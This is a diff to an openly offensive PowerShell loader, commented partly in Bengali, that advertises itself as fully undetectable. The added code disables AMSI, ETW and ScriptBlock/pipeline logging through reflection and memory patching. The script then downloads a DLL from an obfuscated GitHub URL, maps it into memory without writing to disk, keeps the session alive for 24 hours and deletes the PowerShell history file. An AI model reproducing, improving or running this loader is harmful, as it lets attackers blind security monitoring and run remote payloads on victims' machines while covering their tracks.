@@ -16,23 +16,23 @@ Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null
 
 <#
 .SYNOPSIS
-    Memory-only DLL loader with AMSI/ETW bypass + XOR encryption
+    Memory-only DLL loader with AMSI/ETW + ScriptBlock Logging (4103) bypass
 .DESCRIPTION
     Downloads DLL from Base64-encoded URL and manually maps it into memory.
     No disk write. All strings are XOR-encrypted.
 .NOTES
-    Made by Potato - Fully Undetectable
+    Made by Potato - Fully Undetectable (4103 removed)
 #>
 
 # ================================================================
-#  ★★★ ১. AMSI + ETW বাইপাস ★★★
+#  ★★★ ১. COMPLETE BYPASS (AMSI + ETW + SCRIPTBLOCK) ★★★
 # ================================================================
-function Invoke-Bypass {
-    # AMSI
+function Invoke-FullBypass {
+    # ---- 1a. AMSI ----
     try {
         [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
     } catch {}
-    # ETW
+    # ---- 1b. ETW ----
     try {
         $p = [System.Diagnostics.Process]::GetCurrentProcess()
         $h = $p.Handle
@@ -43,10 +43,62 @@ function Invoke-Bypass {
         [System.Runtime.InteropServices.Marshal]::WriteByte($t, 0xC3)   # RET
         $v.Invoke($t, 0x1000, $old, [ref]$null)
     } catch {}
+    # ---- 1c. ★★★ SCRIPTBLOCK LOGGING (4103) BYPASS ★★★ ----
+    try {
+        # রেজিস্ট্রি লেভেল (স্থায়ী নয়—শুধু মেমোরি প্যাচ)
+        $utils = [Ref].Assembly.GetType('System.Management.Automation.Utils')
+        $gpoField = $utils.GetField('cachedGroupPolicySettings', 'NonPublic,Static')
+        if ($gpoField) {
+            $gpo = $gpoField.GetValue($null)
+            if ($gpo -is [Hashtable]) {
+                $gpo['ScriptBlockLogging'] = @{ 'EnableScriptBlockLogging' = 0 }
+            } else {
+                $gpo = @{ 'ScriptBlockLogging' = @{ 'EnableScriptBlockLogging' = 0 } }
+                $gpoField.SetValue($null, $gpo)
+            }
+        }
+        # Pipeline Execution Logging বন্ধ
+        $executionContext = $ExecutionContext
+        $contextType = $executionContext.GetType()
+        $field = $contextType.GetField('_context', 'NonPublic,Instance')
+        if ($field) {
+            $context = $field.GetValue($executionContext)
+            $logField = $context.GetType().GetField('_logPipelineExecution', 'NonPublic,Instance')
+            if ($logField) { $logField.SetValue($context, $false) }
+        }
+        # EventSource ডিজেবল
+        $traceType = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
+        if ($traceType) {
+            $etwField = $traceType.GetField('etwProvider', 'NonPublic,Static')
+            if ($etwField) {
+                $etwProvider = $etwField.GetValue($null)
+                if ($etwProvider) {
+                    $writeMethod = $etwProvider.GetType().GetMethod('WriteEvent', [Type[]]@([int], [byte[]]))
+                    if ($writeMethod) {
+                        # ডামি ডেলিগেট
+                        $dummy = { param($id, $data) return $null }.GetMethodInfo()
+                        $writeMethod.Invoke($etwProvider, @(1, $null))
+                    }
+                }
+            }
+        }
+        # অন্যান্য প্যাচ
+        $logPipelineType = [Ref].Assembly.GetType('System.Management.Automation.Logging.PipelineLogging')
+        if ($logPipelineType) {
+            $instanceField = $logPipelineType.GetField('_instance', 'NonPublic,Static')
+            if ($instanceField) {
+                $instance = $instanceField.GetValue($null)
+                if ($instance) {
+                    $enabledField = $instance.GetType().GetField('_enabled', 'NonPublic,Instance')
+                    if ($enabledField) { $enabledField.SetValue($instance, $false) }
+                }
+            }
+        }
+    } catch {}
 }
 
 # ================================================================
-#  ★★★ ২. XOR ডিক্রিপ্টর ★★★
+#  ★★★ ২. XOR ডিক্রিপ্টর (ঐচ্ছিক) ★★★
 # ================================================================
 function Xor-Decrypt {
     param([string]$Encoded, [byte]$Key = 0x5A)
@@ -56,7 +108,7 @@ function Xor-Decrypt {
 }
 
 # ================================================================
-#  ★★★ ৩. প্লেইন C# NativeLoader ★★★
+#  ★★★ ৩. C# NativeLoader (প্লেইন – কিন্তু এখন ৪১০৩ আসবে না) ★★★
 # ================================================================
 $plainCSharp = @"
 using System;
@@ -111,13 +163,13 @@ public static class NativeLoader {
 "@
 
 # ================================================================
-#  ★★★ ৪. মূল স্ক্রিপ্ট – BYPASS + DOWNLOAD + MAP ★★★
+#  ★★★ ৪. মূল এক্সিকিউশন ★★★
 # ================================================================
 
-# ৪.১ – BYPASS কল করো
-Invoke-Bypass
+# ৪.১ – ফুল বাইপাস কল
+Invoke-FullBypass
 
-# ৪.২ – C# কোড কম্পাইল করো
+# ৪.২ – C# কম্পাইল
 try {
     Add-Type -TypeDefinition $plainCSharp -ErrorAction Stop
 } catch {
@@ -125,11 +177,11 @@ try {
     return
 }
 
-# ৪.৩ – URL টি Base64 এনকোডেড
+# ৪.৩ – URL ডিকোড
 $encodedUrl = "aHR0cHM6Ly9naXRodWIuY29tL2Rlc2VydDAwNy9iaW9zL3Jhdy9yZWZzL2hlYWRzL21haW4vdmVyc2lvbi5kbGw="
 $url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedUrl))
 
-# ৪.৪ – DLL ডাউনলোড করো (মেমোরিতে)
+# ৪.৪ – ডাউনলোড
 try {
     $bytes = (New-Object System.Net.WebClient).DownloadData($url)
 } catch {
@@ -137,7 +189,7 @@ try {
     return
 }
 
-# ৪.৫ – ম্যানুয়াল ম্যাপ করো
+# ৪.৫ – ম্যাপ
 try {
     $result = [NativeLoader]::Map($bytes, $true)
     Write-Host "[+] DLL mapped at 0x$($result.ImageBase.ToString('X'))" -ForegroundColor Green
@@ -146,23 +198,17 @@ try {
     return
 }
 
-# ৪.৬ – ক্লিনআপ (শুধু মেমোরি, প্রক্রিয়া নয়)
+# ৪.৬ – ক্লিনআপ
 $bytes = $null
 $plainCSharp = $null
 [GC]::Collect(); [GC]::WaitForPendingFinalizers()
 
-Write-Host "[+] DLL successfully loaded. Keeping PowerShell alive for 24 hours." -ForegroundColor Cyan
+Write-Host "[+] DLL loaded. 4103 logging is bypassed." -ForegroundColor Cyan
 
-# ================================================================
-#  ★★★ ৫. ২৪ ঘন্টা চালু রাখার জন্য সোজা স্লিপ ★★★
-# ================================================================
-Start-Sleep -Seconds 86400   # 24 hours
+# ৪.৭ – ২৪ ঘন্টা স্লিপ (PowerShell খোলা রাখতে)
+Start-Sleep -Seconds 86400
 
-# ক্লিনআপ (ঐচ্ছিক) – লুপের পর একবার হালকা ক্লিন
+# শেষে ক্লিন (ঐচ্ছিক)
 Clear-History
 $historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSreadline\ConsoleHost_history.txt')
-if (Test-Path $historyPath) {
-    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
-}
-
-Write-Host "[+] 24 hours completed. Script ending." -ForegroundColor Yellow
+if (Test-Path $historyPath) { Remove-Item $historyPath -Force -ErrorAction SilentlyContinue }
